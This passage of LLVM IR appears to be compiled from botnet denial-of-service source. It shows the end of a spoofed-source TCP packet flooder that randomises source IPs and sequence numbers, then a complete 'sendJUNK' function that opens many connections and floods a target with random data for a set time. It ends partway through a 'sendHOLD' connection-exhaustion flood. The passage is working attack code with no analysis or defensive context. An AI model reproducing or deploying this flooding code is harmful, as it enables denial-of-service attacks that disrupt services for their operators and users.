  %248 = call zeroext i16 @htons(i16 zeroext %247) #15
  %249 = zext i16 %248 to i32
  br label %250

250:                                              ; preds = %245, %243
  %251 = phi i32 [ %244, %243 ], [ %249, %245 ]
  %252 = trunc i32 %251 to i16
  %253 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 0
  %255 = bitcast %union.anon* %254 to %struct.anon.0*
  %256 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %255, i32 0, i32 1
  store i16 %252, i16* %256, align 2
  %257 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %258 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %259 = call zeroext i16 @tcpcsum(%struct.iphdr* %257, %struct.tcphdr* %258)
  %260 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon* %261 to %struct.anon.0*
  %263 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %262, i32 0, i32 6
  store i16 %259, i16* %263, align 4
  %264 = bitcast i8* %74 to i16*
  %265 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 2
  %267 = load i16, i16* %266, align 2
  %268 = zext i16 %267 to i32
  %269 = call zeroext i16 @csum(i16* %264, i32 %268)
  %270 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 7
  store i16 %269, i16* %271, align 2
  %272 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %273 = load i32, i32* %10, align 4
  %274 = add nsw i32 %272, %273
  store i32 %274, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %275

275:                                              ; preds = %328, %327, %250
  br label %276

276:                                              ; preds = %275
  %277 = load i32, i32* %17, align 4
  %278 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %279 = call i64 @sendto(i32 %277, i8* %74, i64 %72, i32 0, %struct.sockaddr* %278, i32 16)
  %280 = load i32, i32* %19, align 4
  %281 = call i32 @getRandomIP(i32 %280)
  %282 = call i32 @htonl(i32 %281) #15
  %283 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 8
  store i32 %282, i32* %284, align 4
  %285 = call i32 @rand_cmwc()
  %286 = trunc i32 %285 to i16
  %287 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 3
  store i16 %286, i16* %288, align 4
  %289 = call i32 @rand_cmwc()
  %290 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 0
  %292 = bitcast %union.anon* %291 to %struct.anon.0*
  %293 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %292, i32 0, i32 2
  store i32 %289, i32* %293, align 4
  %294 = call i32 @rand_cmwc()
  %295 = trunc i32 %294 to i16
  %296 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 0
  %298 = bitcast %union.anon* %297 to %struct.anon.0*
  %299 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %298, i32 0, i32 0
  store i16 %295, i16* %299, align 4
  %300 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %301 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %300, i32 0, i32 0
  %302 = bitcast %union.anon* %301 to %struct.anon.0*
  %303 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %302, i32 0, i32 6
  store i16 0, i16* %303, align 4
  %304 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %305 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %306 = call zeroext i16 @tcpcsum(%struct.iphdr* %304, %struct.tcphdr* %305)
  %307 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon* %308 to %struct.anon.0*
  %310 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %309, i32 0, i32 6
  store i16 %306, i16* %310, align 4
  %311 = bitcast i8* %74 to i16*
  %312 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 2
  %314 = load i16, i16* %313, align 2
  %315 = zext i16 %314 to i32
  %316 = call zeroext i16 @csum(i16* %311, i32 %315)
  %317 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %318 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %317, i32 0, i32 7
  store i16 %316, i16* %318, align 2
  %319 = load i32, i32* %26, align 4
  %320 = load i32, i32* %15, align 4
  %321 = icmp eq i32 %319, %320
  br i1 %321, label %322, label %328

322:                                              ; preds = %276
  %323 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %324 = load i32, i32* %25, align 4
  %325 = icmp sgt i32 %323, %324
  br i1 %325, label %326, label %327

326:                                              ; preds = %322
  br label %331

327:                                              ; preds = %322
  store i32 0, i32* %26, align 4
  br label %275

328:                                              ; preds = %276
  %329 = load i32, i32* %26, align 4
  %330 = add i32 %329, 1
  store i32 %330, i32* %26, align 4
  br label %275

331:                                              ; preds = %326
  %332 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %332)
  br label %333

333:                                              ; preds = %331, %58, %52, %45
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendJUNK(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.fd_set*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %21 = call i32 @getdtablesize() #12
  %22 = sdiv i32 %21, 2
  store i32 %22, i32* %7, align 4
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %23, align 4
  %24 = load i32, i32* %5, align 4
  %25 = trunc i32 %24 to i16
  %26 = call zeroext i16 @htons(i16 zeroext %25) #15
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = load i8*, i8** %4, align 8
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %30 = call i32 @getHost(i8* %28, %struct.in_addr* %29)
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %32, label %33

32:                                               ; preds = %3
  br label %233

33:                                               ; preds = %3
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %35 = getelementptr inbounds [8 x i8], [8 x i8]* %34, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %35, i8 0, i64 8, i1 false)
  %36 = load i32, i32* %7, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %10, align 8
  %39 = alloca %struct.state_t, i64 %37, align 16
  store i64 %37, i64* %11, align 8
  %40 = bitcast %struct.state_t* %39 to i8*
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = mul i64 %42, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %40, i8 0, i64 %43, i1 false)
  %44 = call noalias align 16 i8* @malloc(i64 1024) #12
  store i8* %44, i8** %17, align 8
  %45 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %45, i8 0, i64 1024, i1 false)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = load i32, i32* %6, align 4
  %48 = add nsw i32 %46, %47
  store i32 %48, i32* %18, align 4
  br label %49

49:                                               ; preds = %230, %33
  %50 = load i32, i32* %18, align 4
  %51 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %52 = icmp sgt i32 %50, %51
  br i1 %52, label %53, label %231

53:                                               ; preds = %49
  store i32 0, i32* %8, align 4
  br label %54

54:                                               ; preds = %227, %53
  %55 = load i32, i32* %8, align 4
  %56 = load i32, i32* %7, align 4
  %57 = icmp slt i32 %55, %56
  br i1 %57, label %58, label %230

58:                                               ; preds = %54
  %59 = load i32, i32* %8, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %60
  %62 = getelementptr inbounds %struct.state_t, %struct.state_t* %61, i32 0, i32 1
  %63 = load i8, i8* %62, align 4
  %64 = zext i8 %63 to i32
  switch i32 %64, label %226 [
    i32 0, label %65
    i32 1, label %109
    i32 2, label %200
  ]

65:                                               ; preds = %58
  %66 = call i32 @socket(i32 2, i32 1, i32 0) #12
  %67 = load i32, i32* %8, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %68
  %70 = getelementptr inbounds %struct.state_t, %struct.state_t* %69, i32 0, i32 0
  store i32 %66, i32* %70, align 8
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %72
  %74 = getelementptr inbounds %struct.state_t, %struct.state_t* %73, i32 0, i32 0
  %75 = load i32, i32* %74, align 8
  %76 = load i32, i32* %8, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %77
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %78, i32 0, i32 0
  %80 = load i32, i32* %79, align 8
  %81 = call i32 (i32, i32, ...) @fcntl(i32 %80, i32 3, i8* null)
  %82 = or i32 %81, 2048
  %83 = call i32 (i32, i32, ...) @fcntl(i32 %75, i32 4, i32 %82)
  %84 = load i32, i32* %8, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %85
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %90 = call i32 @connect(i32 %88, %struct.sockaddr* %89, i32 16)
  %91 = icmp ne i32 %90, -1
  br i1 %91, label %96, label %92

92:                                               ; preds = %65
  %93 = call i32* @__errno_location() #15
  %94 = load i32, i32* %93, align 4
  %95 = icmp ne i32 %94, 115
  br i1 %95, label %96, label %103

96:                                               ; preds = %92, %65
  %97 = load i32, i32* %8, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %98
  %100 = getelementptr inbounds %struct.state_t, %struct.state_t* %99, i32 0, i32 0
  %101 = load i32, i32* %100, align 8
  %102 = call i32 @close(i32 %101)
  br label %108

103:                                              ; preds = %92
  %104 = load i32, i32* %8, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %105
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %106, i32 0, i32 1
  store i8 1, i8* %107, align 4
  br label %108

108:                                              ; preds = %103, %96
  br label %226

109:                                              ; preds = %58
  br label %110

110:                                              ; preds = %109
  store %struct.fd_set* %12, %struct.fd_set** %20, align 8
  store i32 0, i32* %19, align 4
  br label %111

111:                                              ; preds = %121, %110
  %112 = load i32, i32* %19, align 4
  %113 = zext i32 %112 to i64
  %114 = icmp ult i64 %113, 16
  br i1 %114, label %115, label %124

115:                                              ; preds = %111
  %116 = load %struct.fd_set*, %struct.fd_set** %20, align 8
  %117 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %116, i32 0, i32 0
  %118 = load i32, i32* %19, align 4
  %119 = zext i32 %118 to i64
  %120 = getelementptr inbounds [16 x i64], [16 x i64]* %117, i64 0, i64 %119
  store i64 0, i64* %120, align 8
  br label %121

121:                                              ; preds = %115
  %122 = load i32, i32* %19, align 4
  %123 = add i32 %122, 1
  store i32 %123, i32* %19, align 4
  br label %111, !llvm.loop !44

124:                                              ; preds = %111
  br label %125

125:                                              ; preds = %124
  br label %126

126:                                              ; preds = %125
  %127 = load i32, i32* %8, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %128
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %129, i32 0, i32 0
  %131 = load i32, i32* %130, align 8
  %132 = srem i32 %131, 64
  %133 = zext i32 %132 to i64
  %134 = shl i64 1, %133
  %135 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %136 = load i32, i32* %8, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %137
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %138, i32 0, i32 0
  %140 = load i32, i32* %139, align 8
  %141 = sdiv i32 %140, 64
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [16 x i64], [16 x i64]* %135, i64 0, i64 %142
  %144 = load i64, i64* %143, align 8
  %145 = or i64 %144, %134
  store i64 %145, i64* %143, align 8
  %146 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %146, align 8
  %147 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %147, align 8
  %148 = load i32, i32* %8, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %149
  %151 = getelementptr inbounds %struct.state_t, %struct.state_t* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 8
  %153 = add nsw i32 %152, 1
  %154 = call i32 @select(i32 %153, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %154, i32* %16, align 4
  %155 = load i32, i32* %16, align 4
  %156 = icmp eq i32 %155, 1
  br i1 %156, label %157, label %184

157:                                              ; preds = %126
  store i32 4, i32* %14, align 4
  %158 = load i32, i32* %8, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %159
  %161 = getelementptr inbounds %struct.state_t, %struct.state_t* %160, i32 0, i32 0
  %162 = load i32, i32* %161, align 8
  %163 = bitcast i32* %15 to i8*
  %164 = call i32 @getsockopt(i32 %162, i32 1, i32 4, i8* %163, i32* %14) #12
  %165 = load i32, i32* %15, align 4
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %167, label %178

167:                                              ; preds = %157
  %168 = load i32, i32* %8, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %169
  %171 = getelementptr inbounds %struct.state_t, %struct.state_t* %170, i32 0, i32 0
  %172 = load i32, i32* %171, align 8
  %173 = call i32 @close(i32 %172)
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 1
  store i8 0, i8* %177, align 4
  br label %183

178:                                              ; preds = %157
  %179 = load i32, i32* %8, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %180
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %181, i32 0, i32 1
  store i8 2, i8* %182, align 4
  br label %183

183:                                              ; preds = %178, %167
  br label %199

184:                                              ; preds = %126
  %185 = load i32, i32* %16, align 4
  %186 = icmp eq i32 %185, -1
  br i1 %186, label %187, label %198

187:                                              ; preds = %184
  %188 = load i32, i32* %8, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %189
  %191 = getelementptr inbounds %struct.state_t, %struct.state_t* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 8
  %193 = call i32 @close(i32 %192)
  %194 = load i32, i32* %8, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %195
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %196, i32 0, i32 1
  store i8 0, i8* %197, align 4
  br label %198

198:                                              ; preds = %187, %184
  br label %199

199:                                              ; preds = %198, %183
  br label %226

200:                                              ; preds = %58
  %201 = load i8*, i8** %17, align 8
  call void @makeRandomStr(i8* %201, i32 1024)
  %202 = load i32, i32* %8, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %203
  %205 = getelementptr inbounds %struct.state_t, %struct.state_t* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 8
  %207 = load i8*, i8** %17, align 8
  %208 = call i64 @send(i32 %206, i8* %207, i64 1024, i32 16384)
  %209 = icmp eq i64 %208, -1
  br i1 %209, label %210, label %225

210:                                              ; preds = %200
  %211 = call i32* @__errno_location() #15
  %212 = load i32, i32* %211, align 4
  %213 = icmp ne i32 %212, 11
  br i1 %213, label %214, label %225

214:                                              ; preds = %210
  %215 = load i32, i32* %8, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %216
  %218 = getelementptr inbounds %struct.state_t, %struct.state_t* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 8
  %220 = call i32 @close(i32 %219)
  %221 = load i32, i32* %8, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %222
  %224 = getelementptr inbounds %struct.state_t, %struct.state_t* %223, i32 0, i32 1
  store i8 0, i8* %224, align 4
  br label %225

225:                                              ; preds = %214, %210, %200
  br label %226

226:                                              ; preds = %58, %225, %199, %108
  br label %227

227:                                              ; preds = %226
  %228 = load i32, i32* %8, align 4
  %229 = add nsw i32 %228, 1
  store i32 %229, i32* %8, align 4
  br label %54, !llvm.loop !45

230:                                              ; preds = %54
  br label %49, !llvm.loop !46

231:                                              ; preds = %49
  %232 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %232)
  br label %233

233:                                              ; preds = %231, %32
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendHOLD(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.fd_set*, align 8
  %21 = alloca i32, align 4
  %22 = alloca %struct.fd_set*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %23 = call i32 @getdtablesize() #12
  %24 = sdiv i32 %23, 2
  store i32 %24, i32* %7, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %5, align 4
  %27 = trunc i32 %26 to i16
  %28 = call zeroext i16 @htons(i16 zeroext %27) #15
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = load i8*, i8** %4, align 8
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %32 = call i32 @getHost(i8* %30, %struct.in_addr* %31)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

34:                                               ; preds = %3
  br label %269

35:                                               ; preds = %3
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %37, i8 0, i64 8, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t.4, i64 %39, align 16
  store i64 %39, i64* %11, align 8
  %42 = bitcast %struct.state_t.4* %41 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %42, i8 0, i64 %45, i1 false)
  %46 = call noalias align 16 i8* @malloc(i64 1024) #12
  store i8* %46, i8** %17, align 8
  %47 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %47, i8 0, i64 1024, i1 false)
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = load i32, i32* %6, align 4
  %50 = add nsw i32 %48, %49
  store i32 %50, i32* %18, align 4
  br label %51

51:                                               ; preds = %266, %35
  %52 = load i32, i32* %18, align 4
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = icmp sgt i32 %52, %53
  br i1 %54, label %55, label %267

55:                                               ; preds = %51
  store i32 0, i32* %8, align 4
  br label %56

56:                                               ; preds = %263, %55
  %57 = load i32, i32* %8, align 4
  %58 = load i32, i32* %7, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %266

60:                                               ; preds = %56
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %62
  %64 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  switch i32 %66, label %262 [
    i32 0, label %67
    i32 1, label %111
    i32 2, label %202
  ]

67:                                               ; preds = %60
  %68 = call i32 @socket(i32 2, i32 1, i32 0) #12
  %69 = load i32, i32* %8, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %70
  %72 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %71, i32 0, i32 0
  store i32 %68, i32* %72, align 8
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %74
  %76 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %75, i32 0, i32 0
  %77 = load i32, i32* %76, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %79
  %81 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 8
  %83 = call i32 (i32, i32, ...) @fcntl(i32 %82, i32 3, i8* null)
  %84 = or i32 %83, 2048
  %85 = call i32 (i32, i32, ...) @fcntl(i32 %77, i32 4, i32 %84)
  %86 = load i32, i32* %8, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %87
  %89 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %88, i32 0, i32 0
  %90 = load i32, i32* %89, align 8
  %91 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %92 = call i32 @connect(i32 %90, %struct.sockaddr* %91, i32 16)
  %93 = icmp ne i32 %92, -1
  br i1 %93, label %98, label %94

94:                                               ; preds = %67
  %95 = call i32* @__errno_location() #15
  %96 = load i32, i32* %95, align 4
  %97 = icmp ne i32 %96, 115
  br i1 %97, label %98, label %105

98:                                               ; preds = %94, %67
  %99 = load i32, i32* %8, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %100
  %102 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %101, i32 0, i32 0
  %103 = load i32, i32* %102, align 8
  %104 = call i32 @close(i32 %103)
  br label %110

105:                                              ; preds = %94
  %106 = load i32, i32* %8, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %107
  %109 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %108, i32 0, i32 1
  store i8 1, i8* %109, align 4
  br label %110

110:                                              ; preds = %105, %98
  br label %262

111:                                              ; preds = %60
  br label %112

112:                                              ; preds = %111
  store %struct.fd_set* %12, %struct.fd_set** %20, align 8
  store i32 0, i32* %19, align 4
  br label %113

113:                                              ; preds = %123, %112
  %114 = load i32, i32* %19, align 4
  %115 = zext i32 %114 to i64
  %116 = icmp ult i64 %115, 16
  br i1 %116, label %117, label %126

117:                                              ; preds = %113
  %118 = load %struct.fd_set*, %struct.fd_set** %20, align 8
  %119 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %118, i32 0, i32 0
  %120 = load i32, i32* %19, align 4
  %121 = zext i32 %120 to i64
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %119, i64 0, i64 %121
  store i64 0, i64* %122, align 8
  br label %123

123:                                              ; preds = %117
  %124 = load i32, i32* %19, align 4
  %125 = add i32 %124, 1
  store i32 %125, i32* %19, align 4
  br label %113, !llvm.loop !47

126:                                              ; preds = %113
  br label %127

127:                                              ; preds = %126
  br label %128

128:                                              ; preds = %127
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %130
  %132 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %131, i32 0, i32 0
  %133 = load i32, i32* %132, align 8
  %134 = srem i32 %133, 64
  %135 = zext i32 %134 to i64
  %136 = shl i64 1, %135
  %137 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %139
  %141 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = sdiv i32 %142, 64
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [16 x i64], [16 x i64]* %137, i64 0, i64 %144
  %146 = load i64, i64* %145, align 8
  %147 = or i64 %146, %136
  store i64 %147, i64* %145, align 8
  %148 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %148, align 8
  %149 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %149, align 8
  %150 = load i32, i32* %8, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %151
  %153 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = add nsw i32 %154, 1
  %156 = call i32 @select(i32 %155, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %156, i32* %16, align 4
  %157 = load i32, i32* %16, align 4
  %158 = icmp eq i32 %157, 1
  br i1 %158, label %159, label %186

159:                                              ; preds = %128
  store i32 4, i32* %14, align 4
  %160 = load i32, i32* %8, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %161
  %163 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %162, i32 0, i32 0
  %164 = load i32, i32* %163, align 8
  %165 = bitcast i32* %15 to i8*
  %166 = call i32 @getsockopt(i32 %164, i32 1, i32 4, i8* %165, i32* %14) #12
  %167 = load i32, i32* %15, align 4
  %168 = icmp ne i32 %167, 0
  br i1 %168, label %169, label %180

169:                                              ; preds = %159
  %170 = load i32, i32* %8, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %171
  %173 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %172, i32 0, i32 0
  %174 = load i32, i32* %173, align 8
  %175 = call i32 @close(i32 %174)
  %176 = load i32, i32* %8, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %177
  %179 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %178, i32 0, i32 1
  store i8 0, i8* %179, align 4
  br label %185

180:                                              ; preds = %159
